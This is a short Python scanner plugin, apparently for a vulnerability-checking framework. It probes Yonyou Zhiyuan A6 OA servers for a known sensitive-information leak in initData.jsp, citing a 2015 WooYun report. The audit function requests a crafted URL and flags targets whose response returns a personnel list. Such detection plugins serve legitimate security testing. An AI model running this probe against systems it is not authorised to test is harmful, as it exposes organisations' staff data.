#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 用友致远A6 initData.jsp敏感信息泄露
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0107543


def assign(service, arg):
    if service == 'yongyou_zhiyuan_a6':
        return True, arg


def audit(arg):
    payload = 'yyoa/common/selectPersonNew/initData.jsp?trueName=1'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and 'personList' in res and 'new Person' in res:
        security_warning(target)

        return arg
if __name__== '__main__':
    from dummy import *
